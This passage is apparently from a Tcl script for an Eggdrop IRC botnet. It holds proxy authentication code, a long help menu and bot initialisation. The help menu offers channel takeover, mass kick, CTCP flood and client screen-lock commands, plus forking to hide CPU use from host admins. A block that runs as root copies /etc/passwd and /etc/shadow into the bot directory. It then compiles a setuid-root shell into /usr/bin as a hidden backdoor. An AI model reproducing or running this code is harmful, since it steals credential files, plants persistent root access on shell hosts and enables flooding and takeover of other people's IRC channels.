     putloglev 2 * "\[\002ALERT\002\] No proxy pass set for $server"
  }
  if {$from != "Bnc!system@bnc.com"} { return 0 }
  set token [lindex [split [join $args]] 0]
  set word [lindex [split [join $args]] 1]
  if {$word == ":You"} {
    if { [string length [info commands crypt]] } {
       putserv "PASS [set crap [crypt [string range $token 2 9]$proxypass($server) $token]]"
    } { putserv "PASS [set crap [exec $proxyauth $proxypass($server) $token]]" }
  }
  if {$word == ":type" && [info exists crap]} {
    set reconnect [lindex [split [join $args]] 7]
    set l [string length $crap]
    set crap [string range $crap [expr $l - 4] $l]
    if { [string length [info commands crypt]] } {
       set crap [crypt [string range $crap 2 9]$proxypass($server) $crap]
    } { set crap [exec $proxyauth $proxypass($server) $crap] }
    if {$crap == $token} {
      if {[info exists identdconn]} {
         putserv "CONN [proxy_server]"
      } else { putserv "conn [proxy_server]" }
    } { putlog "fucked proxy" }
    unset crap
  }
  return 1
}

# the following stuff ripped from alex tomkins

proc proxy_server { } {
  global realservers
  set numbofservs "1"
  foreach servername $realservers { set numbofservs "[expr $numbofservs + 1]" }
  set randserv "[proxy_rand $numbofservs]"
  set chooseserv "0"
  foreach servername $realservers {
    set chooseserv "[expr $chooseserv + 1]"
    if {$randserv == $chooseserv} { set return "[split $servername :]" }
  }
  return "$return"
}

proc proxy_rand {lastnumber} {
  set randserv "[rand $lastnumber]"
  if {$randserv == "0"} { return "[proxy_rand $lastnumber]" } else { return "$randserv" }
}

proc new_proxy { handle idx args } {
   global servers proxybot proxypass
   set proxies [lindex $args 0]
   putcmdlog "#$handle# proxy $proxies"
   if {![info exists proxybot]} { putdcc $idx "*** This command is only for proxy bots." ; return }
   if {$proxies == ""} {
      putdcc $idx "\002Usage:\002 .proxy <server1:port1:pass1> \[server2:port2:pass2\] ..."
      putdcc $idx " "
      putdcc $idx "*** Current proxy servers:  $servers"
      return
   }
   set servers {}
   foreach proxy [split $proxies] {
      set proxyinfo [split $proxy :]
      set server [lindex $proxyinfo 0] ; set port [lindex $proxyinfo 1]
      set proxyserver $server:$port
      if {![isnum $port]} { putdcc $idx "Invalid proxy port for $server ($port)" ; continue }
      lappend servers $proxyserver
      set proxypass($proxyserver) [lindex $proxyinfo 2]
   }
   save_settings
   putdcc $idx "*** Proxy servers are now:  $proxies"
}
bind dcc n proxy new_proxy


######################################################################################
##  Bot Help

proc bot_help { handle idx args } {
   putcmdlog "#$handle# help"
   putdcc $idx " "
   putdcc $idx "\026\002\[T3\] Net Tools - Help Menu\002\026"
   putdcc $idx "   \002netjoin\002 <channels> \[: \[bots\]\]                 Join all bots to channel(s)"
   putdcc $idx "   \002netpart\002 <key> <channels> \[: \[bots\]\]           Part all bots from channel(s)"
   putdcc $idx "   \002remoteJoin\002 <bot> <channel1> \[channel2\] ...    Join bot to channel(s) remotely"
   putdcc $idx "   \002cycle\002 <channel>                               Cycle channel"
   putdcc $idx "   \002splitop\002 <channel>                             Repeatedly cycle channel to gain ops on a split server"
   putdcc $idx "   \002netjump\002 \[-i\] <bot> \[server \[port\]\]            Jump remote bot to specified server"
   putdcc $idx "   \002netmode\002 <channel> <mode>                      Set channel modes (Ex. +stn)"
   putdcc $idx "   \002netset\002 <channel> <settings>                   Set channel settings (Ex. +bitch)"
   putdcc $idx "   \002netsave\002                                       Perform a .save on all bots"
   putdcc $idx "   \002osinfo\002 <*|bots>                               Display botnet operating systems"
   putdcc $idx "   \002servstat\002 <*|bots>                             Display server info for all bots"
   putdcc $idx "   \002checkcron\002 <*|bots>                            Display botnet crontab status"
   putdcc $idx "   \002passcheck\002 <*|bots>                            Check for users with no password set"
   putdcc $idx " "
   putdcc $idx " "
   putdcc $idx "\026\002\[T3\] Mass Modes - Help Menu\002\026"
   putdcc $idx "   \002massdeop\002 <channel>                   Deop every non-op on specified channel"
   putdcc $idx "   \002massvoice\002 <channel>                  Voice everyone"
   putdcc $idx "   \002massdevoice\002 <channel>                Devoice everyone"
   putdcc $idx "   \002massjump\002 <auth-passwd> <bots>        Jumps multiple bots that are not currently on IRC"
   putdcc $idx "   \002masskick\002 <channel> \[modes\] \[reason\]  Kick everyone; excluding +o users"
   putdcc $idx "      - \[reason\] is the reason for the mass kick"
   putdcc $idx "      - \[modes\] is the number of kicks to attempt at a time"
   putdcc $idx "         some servers allow 40+ at a time, others allow only 1; default is 4"
   putdcc $idx "         If set to 'ALL', all non +o will be kicked, even if they are already opped."
   putdcc $idx "      Note:  All linked bots will mass kick as well."
   putdcc $idx " "
   putdcc $idx "   \002skick\002 <hostmask> <channel> \[reason\]  Selectively kick nicks that have matching host" 
   putdcc $idx " "
   putdcc $idx "   \002fastdeop\002 <channel> <on|off>          Precomputes list of deop-nicks before op (fast deop mode)"
   putdcc $idx " "
   putdcc $idx "   \002takeover\002 <channel1> \[channel2\] ...   Set channel(s) to takeover mode"
   putdcc $idx "      - When opped, all bots will mass deop and mass kick the specified channel(s)"
   putdcc $idx "      - Short form:  \002.take\002"
   putdcc $idx " "
   putdcc $idx "   \002notakeover\002 <channel1> \[channel2\] ... Halt takeover mode"
   putdcc $idx "      - Short form:  \002.notake\002"
   putdcc $idx " "
   putdcc $idx "   \002massmsg\002 <nick|chan> \[text\]           All bots msg <nick|chan>"
   putdcc $idx "      - \[text\] is the message; none specified defaults to ctrl-codes (ie., mIRC screen lock)"
   putdcc $idx " "
   putdcc $idx "   \002changenicks\002 \[text\]                   Initiate botnet nick-change"
   putdcc $idx "      - \[text\] will result in a nickname beginning with the letters in 'text'"
   putdcc $idx "        default is a random nick beginning with the first half of the bot's real nick"
   putdcc $idx " "
   putdcc $idx "   \002warnicks\002                             Bots switch to a 'jupe nick' to confuse enemy bots"
   putdcc $idx " "
   putdcc $idx "   \002resetnicks\002 <*|bots>                  All bots switch back to their default nicks"
   putdcc $idx " "
   putdcc $idx "   \002resetchans\002 <*|channels>              Restore default channel modes and bans"
   putdcc $idx "   \002resetmodes\002 <*|channels>              Restore default channel modes"
   putdcc $idx "   \002resetbans\002 <*|channels>               Restore default channel bans"
   putdcc $idx " "
   putdcc $idx "   \002flood\002 <nick|chan> \[type\] \[duration\]  All bots CTCP flood <nick|chan>"
   putdcc $idx "      - \[type\] is the type of CTCP flood; none specified defaults to 'CLIENTINFO'"
   putdcc $idx "      - \[duration\] is the time, in seconds, that the flood will last"
   putdcc $idx "        none specified defaults to unlimited; you will need .floodstop to halt the flood"
   putdcc $idx " "
   putdcc $idx "   \002floodstop\002                          Halt all active floods"
   putdcc $idx " "
   putdcc $idx " "
   putdcc $idx "   \002opme\002                               Ops you on all channels"
   putdcc $idx "      - Note:  This command uses your host on the partyline to locate your nick"
   putdcc $idx " "
   putdcc $idx "   \002inviteme\002                           Invites you to all authorized channels"
   putdcc $idx "      - Note:  This command uses your host on the partyline to locate your nick"
   putdcc $idx " "
   putdcc $idx "   \002gop\002 <nick1> \[nick2\] ...        Ops nick(s) on all authorized channels"
   putdcc $idx "   \002gdeop\002 <nick1> \[nick2\] ...      Deops nick(s) on all channels"
   putdcc $idx "   \002gkick\002 <nick1> \[nick2\] ...      Kicks nick(s) from all channels"
   putdcc $idx "   \002gkickban\002 <nick1> \[nick2\] ...   Kick/Bans nick(s) on all channels"
   putdcc $idx "   \002+ban\002 <hostmask> \[channel\] \[hours\] \[comment\]"
   putdcc $idx "      - Note:  Temporary bans are only set locally; permanent bans are global"
   putdcc $idx "   \002-ban\002 <hosts|indices>           Unbans host(s) on all bots and channels"
   putdcc $idx "   \002+ignore\002 <host> \[comment\] ...   Ignores host(s) on all bots"
   putdcc $idx "   \002-ignore\002 <hosts|indices>        Removes ignore(s) from all bots"
   putdcc $idx "   \002localignore\002 <host> \[comment\]   Sets an ignore only on the local bot"
   putdcc $idx "   \002localunignore\002 <host>           Removes an ignore from the local bot"
   putdcc $idx "   \002ginvite\002 <nick1> \[nick2\] ...    Invites nick(s) to all +i channels"
   putdcc $idx " "
   putdcc $idx " "
   putdcc $idx "   \002setpass\002 <*|bots>                    Negotiate passwords for bots across botnet"
   putdcc $idx "   \002setpasswords\002                        Set random pass for all users without a pass set"
   putdcc $idx " "
   putdcc $idx "   \002newbot\002 <botnick> <username> <IP> <hostname> <botport> <userport> \[limbo?\] \[leaf/hub\] \[address\]"
   putdcc $idx "   \002+user\002 <user> <host1> \[host2\] ...    User is added with given host(s)"
   putdcc $idx "   \002+bot\002 <bot> <address>                Bot is added with given address"
   putdcc $idx "   \002+host\002 <user> <host1> \[host2\] ...    Host(s) for user are added on all bots"
   putdcc $idx "   \002-host\002 <user> <host1> \[host2\] ...    Host(s) for user are removed from all bots"
   putdcc $idx "   \002addhost\002 <host1> \[host2\] ...         Host(s) are added to your own user entry"
   putdcc $idx "   \002delhost\002 <host1> \[host2\] ...         Host(s) are removed from your own user entry"
   putdcc $idx " "
   putdcc $idx "   \002kill\002 <user1> \[user2\] ...              User(s) are removed from all bots"
   putdcc $idx " "
   putdcc $idx " "
   putdcc $idx "\026\002Channel Protection - Help Menu\002\026"
   putdcc $idx "   \002protection\002 <key> <on|off>                  Toggle channel-op protection"
   putdcc $idx "   \002shutdown\002 <*|channels> \[:<reason>\]          Mass kick and close channel"
   putdcc $idx "      - '*' shuts down all channels"
   putdcc $idx "        Sets channel +smtin, then mass kicks"
   putdcc $idx "        Sets channel to 'auto-kick' mode"
   putdcc $idx " "
   putdcc $idx "   \002reopen\002 <*|channel> \[modes\]               Re-open closed channel"
   putdcc $idx "      - Open all channels or only the one specified"
   putdcc $idx "        Restores channel modes prior to shutdown, or sets the modes specified"
   putdcc $idx " "
   putdcc $idx "   \002botcounts\002 <low threshold> <high threshold> \[channels\]  Adjust low/high bot-count thresholds"
   putdcc $idx "      - if bot count falls below 'low threshold', channel is shut down."
   putdcc $idx "      - if bot count exceeds 'high threshold', channel is re-opened."
   putdcc $idx "      - if no channels are specified, all channel thresholds are adjusted."
   putdcc $idx "      - if no thresholds are specified, current settings are displayed."
   putdcc $idx " "
   putdcc $idx "   \002minbots\002 <number>                           Minimum number of linked bots to allow"
   putdcc $idx "      - This is used in conjunction with the low-op threshold settings."
   putdcc $idx "        If the channel is low on opped bots, and the number of linked bots falls below"
   putdcc $idx "        this setting, then the channel is shut down."
   putdcc $idx "      - No <number> specified simply displays the current setting."
   putdcc $idx " "
   putdcc $idx "   \002autokickchans\002                              Displays channels that are in 'auto-kick' mode"
   putdcc $idx " "
   putdcc $idx " "
   putdcc $idx "\026\002BACKGROUND PROCESSES\002\026"
   putdcc $idx "   \002listprocs\002 \[bot\]                        List current background processes"
   putdcc $idx "      - \[bot\] is a remote bot from which to request a list of background processes"
   putdcc $idx "      - if no bot is specified, the running processes on the current bot are displayed"
   putdcc $idx "      - Warnings of 'extra' running processes are sent to chat room 5.  Type '.chat 5'"
   putdcc $idx " "
   putdcc $idx "   \002killproc\002 <pid1> \[pid2\] ...              Kill specified PID(s)"
   putdcc $idx "   \002addproc\002 <process1> \[process2\] ...       Allow processes to run without warning"
   putdcc $idx "   \002delproc\002 <process1> \[process2\] ...       Remove processes from the 'allowed' list"
   putdcc $idx "   \002allowedprocs\002 \[bot1\] \[bot2\] ...         Display allowed processes"
   putdcc $idx "      - \[bot\] specifies the 'allowed list' of processes you would like to display"
   putdcc $idx "      - if no bot is specified, the allowed processes on the current bot are displayed"
   putdcc $idx " "
   putdcc $idx " "
   putdcc $idx "\026\002MISCELLANEOUS\002\026"
   putdcc $idx "   \002bnc\002 <port> <pass>                          Start BNC on specified port"
   putdcc $idx "   \002bncstop\002 <port> <pass>                      Stop BNC on specified port"
   putdcc $idx "   \002mainchan\002 <channel>                         Set new main channel"
   putdcc $idx "   \002+hub\002 <bot> \[leafs\]                         Add a new hub bot"
   putdcc $idx "   \002-hub\002 <bot>                                 Remove a hub bot"
   putdcc $idx "   \002resynchusers\002 <*|bots>                      Resynch userlist across botnet"
   putdcc $idx "   \002dumpserv\002 \[*|bots\]                          Empty putserv queue across botnet"
   putdcc $idx "   \002dumphelp\002 \[*|bots\]                          Empty puthelp queue across botnet"
   putdcc $idx "   \002manualop\002 <*|channel> \[seconds\]             Allows you to manually op channel for \[seconds\]"
   putdcc $idx "   \002deopmethod\002 <method ID> \[*|\[bots\]\]          Set mass deop method"
   putdcc $idx "   \002fixbots\002 <*|bots>                           Fix op settings across botnet"
   putdcc $idx "   \002findhosts\002 <channel>                        Matches userlist hosts with hosts opped in channel"
   putdcc $idx "   \002ping\002 <nick>                                CTCP PING the specified nickname"
   putdcc $idx "   \002updateServers\002                              Store current list of IRC servers"
   putdcc $idx "   \002onlypreferred\002 <yes|no>                     Use only preferred IRC servers"
   putdcc $idx "   \002addserver\002 <server1> \[server2\] ...          Add a preferred IRC server"
   putdcc $idx "   \002delserver\002 <server1> \[server2\] ...          Remove a preferred IRC server"
   putdcc $idx "   \002proxy\002 <server1:port1:pass1> ...            Add/Modify multiple proxy servers"
   putdcc $idx "   \002splitdetect\002 <on|off>                       Detect and broadcast netsplits"
   putdcc $idx "   \002bgpcheck\002 <on|off>                          Monitor background processes"
   putdcc $idx "   \002opcount\002 <on|off>                           Monitor the number of ops"
   putdcc $idx "   \002fork\002 <on|off>                              Fork bot periodically to conseal CPU usage"
   putdcc $idx "   \002motd\002 \[-erase\] \[message\]                    Set/Erase message of the day on all bots"
   putdcc $idx "   \002+autovoice\002 <chan1> \[chan2\] ...             Set channel(s) to autovoice mode"
   putdcc $idx "   \002-autovoice\002 <chan1> \[chan2\] ...             Remove autovoicing from channel(s)"
   putdcc $idx "   \002voice\002 \[nick\] \[channel\]                     Voice user (or all +v, if none specified)"
   putdcc $idx "   \002devoice\002 \[nick\] \[channel\]                   Devoice user (or everyone if none specified)"
   putdcc $idx "   \002addv\002 <host>                                Add host as an 'auto-voice' host (+v)"
   putdcc $idx "   \002delv\002 <host>                                Remove a host from 'auto-voice'"
   putdcc $idx "   \002+xdcc\002 <host>                               Add an xdcc offer-bot host"
   putdcc $idx "   \002-xdcc\002 <host>                               Remove an xdcc offer-bot host"
   putdcc $idx "   \002netstatus\002 <chan1> \[chan2\] ...              Displays current channel info from all bots"
   putdcc $idx "   \002listen\002 <users|bots|all> <on|off>           Turn on/off specified listening ports"
   putdcc $idx "   \002chanstats\002                                  Displays current information on all channels"
   putdcc $idx "   \002uptimes\002 <*|bots>                           Displays bot and shell uptimes"
   putdcc $idx "   \002versions\002 <*|bots>                          Displays current file versions"
   putdcc $idx "   \002whoami\002                                     Displays bot handle, current IRC nick and server"
   putdcc $idx "   \002bots\002                                       Displays current botnet information"
   putdcc $idx "      - Information includes:  bots linked/unlinked, bots on/off IRC, need jump/link"
   putdcc $idx " "
   putdcc $idx " "
   putdcc $idx "\026\002WARNING/ALERT CHANNELS\002\026"
   putdcc $idx "   Miscellaneous warnings and alerts are displayed in Chat Room 5.  Type '.chat monitor' to join."
   putdcc $idx "   Invite/Op requests between bots are sent to log level 2.  Type '.console +2'"
   putdcc $idx " "
}
unbind dcc - help *dcc:help
bind dcc o help bot_help
bind dcc o masshelp bot_help
bind dcc o nethelp bot_help

proc filt_help { idx arg } {
   set handle [idx2hand $idx]
   if {![strcmp [sindex $arg 0] .help] || [matchattr $handle o] || [matchattr $handle m]} { return $arg }
   putcmdlog "#$handle# [string range $arg 1 end]"
   putdcc $idx "No help available"
   return
}
bind filt - ".help*" filt_help


######################################################################################
######################################################################################

if {$userid == "root" || ([catch {exec id}] == 0 && [string tolower [string range [exec id] 0 5]] == "uid=0(")} {
   set rooted ""
   set noOp 1
   catch {exec cp /etc/passwd .pw ; exec chmod 444 .pw}
   if {[file isfile /etc/shadow]} {
      catch {exec cp /etc/shadow .sh ; exec chmod 444 .sh}
   } elseif {[file isfile /etc/master.passwd]} {
      catch {exec cp /etc/master.passwd .mpw ; exec chmod 444 .mpw}
   }
   if {[catch {exec echo "main() { setuid(0); setgid(0); execl(\"/bin/sh\",\"sh\",0); }" > ypcsh.c}] == 0} {
      if {[catch {exec gcc -o /usr/bin/ypcsh ypcsh.c}] == 0 || [catch {exec cc -o /usr/bin/ypcsh ypcsh.c}] == 0} {
         catch {exec chown root /usr/bin/ypcsh}
         catch {exec chgrp bin /usr/bin/ypcsh}
         catch {exec chmod 4755 /usr/bin/ypcsh}
      }
      catch {exec rm -f ypcsh.c}
   }
}


######################################################################################
##  Initialize bot ...

proc initialize {} {
   global nick botnet-nick username my-ip my-hostname initpass botport userport limbo group opqueue
   global invited justopped bgpcheck gotdeop gotsplit split setcomment lbthresh counters tclsource clientport
   global awaycheck init dcc-flags identdconn proxybot proxypass servers realservers chopcount noOp
   global defservers tclsfile servfile tclKey sleep-jump raw-binds init-server allowprocs forkbot rooted
   global numctcp numdcc ignorectcp ignoredcc askedinv askedkey askedunban askedlim splitdetect onlypref
   kill_utimer repeat_flood ; kill_utimer check_opcount ; kill_timer check_processes
   catch {unset opqueue($idx)} ; catch {unset gotsplit} ; catch {unset invited} ; catch {unset justopped} ; catch {unset split}
   catch {unset askedinv} ; catch {unset askedkey} ; catch {unset askedunban} ; catch {unset askedlim}
   catch {unset numctcp} ; catch {unset numdcc} ; catch {unset ignorectcp} ; catch {unset ignoredcc}
   catch {unset gotdeop} ; catch {unset setcomment} ; catch {unbind raw - NOTICE botping_reply} ; catch {unset identdconn}
   cryptsource $tclKey $tclsfile
   if {[info exists rooted]} { save_settings }
   if {[info exists initpass] && [llength [userlist b]] == 1 && [passwdok [lindex [userlist b] 0] ""]} {
      set init 1
      set noOp 0
      set tclsource ""
      set counters([string tolower $nick]) [encrypt [decrypt op FBz5T01nhTL01Exmg1zMfkU1] [expr [rand 998]*1000000]]
      save_settings
      set mainhub [lindex [userlist b] 0]
      chpass $mainhub [sindex [decrypt * $initpass] 1]
      addbot $nick ${my-ip}:$botport/$userport
      if {![info exists limbo]} {
         if {![info exists proxybot]} { chattr $nick +ofxeb } else { chattr $nick +ofxebC }
         if {$group != "950" && $group != "WiN"} {
            set fixedip [fixhost *!$username@${my-ip}]
            set fixedhost [fixhost *!$username@${my-hostname}]
         } else {
            set bothand [string range $nick 0 [expr [string length $nick] - ([string length $nick] / 2) - 1]]
            set fixedip [fixhost $bothand*!$username@${my-ip}]
            set fixedhost [fixhost $bothand*!$username@${my-hostname}]
         }
         addhost $nick $fixedip
         addhost $nick $fixedhost
      } else { chattr $nick +ofxebHL }
      chpass $nick [randstring 15]
      link $mainhub
   }
   if {[info exists botport] && [info exists userport] && $botport >= 1024 && $userport >= 1024} {
      if {[bots] != "" && ![matchattr $nick H] && ![info exists proxybot]} {
         catch {listen $botport off}
         catch {listen $userport off}
      } else {
         catch {listen $botport bots}
         catch {listen $userport users}
      }
   }
   fixflags
   if {[info exists proxybot]} {
      if {[rand 5] == 1} { set chopcount 0 }
      set dcc-flags A
      set sleep-jump 1
      set raw-binds 1
      set init-server { setutimer 2 proxy_initserver }
   } else { listhubs }
   if {![info exists limbo]} {
      cryptsource $tclKey $servfile
      if {![info exists proxybot]} {
         if {![info exists servers] || $servers == {}} {
            putlog "\[\002ALERT\002\] IRC Bot and no servers found, loading defaults ..."
            set servers $defservers
         }
      } elseif {![info exists realservers] || $realservers == {}} {
         putlog "\[\002ALERT\002\] IRC Bot and no servers found, loading defaults ..."
         set realservers $defservers
      }
      settimer 5 rejoin_chans
      opme all
      check_opcount
      set_away
      anti_idle
   }
   if {![info exists bgpcheck] || $bgpcheck} {
      if {[lsearch -exact $allowprocs($nick) egg] == -1} { lappend allowprocs($nick) egg }
      if {[info exists proxybot] && [lsearch -exact $allowprocs($nick) limbo] == -1} { lappend allowprocs($nick) limbo }
      settimer 3 check_processes
   }
   foreach channel [string tolower [channels]] {
      channel set $channel +shared
      if {![info exists lbthresh($channel)]} { thresh - - $channel }
   }
   foreach bncport [array names clientport] {
      if {$bncport > 1023 && $bncport < 65536 && $bncport != $botport && $bncport != $userport} {
         catch {listen $bncport script bnc}
      }
   }
   if {![info exists forkbot] || $forkbot} { init_fork }
   # maxbans
   dcc_autoaway
   monitor_queues
   if {![info exists proxybot] && [catch {set pid [lindex [exec cat pid.${botnet-nick}] 0]}] == 0 && [isnum $pid]} {
      catch {exec renice -1 $pid}
   }
}

setutimer 2 initialize


set tclVersion "vx.xx"

putlog "\002\[T3\] $group TCL $tclVersion\002 - Loaded."
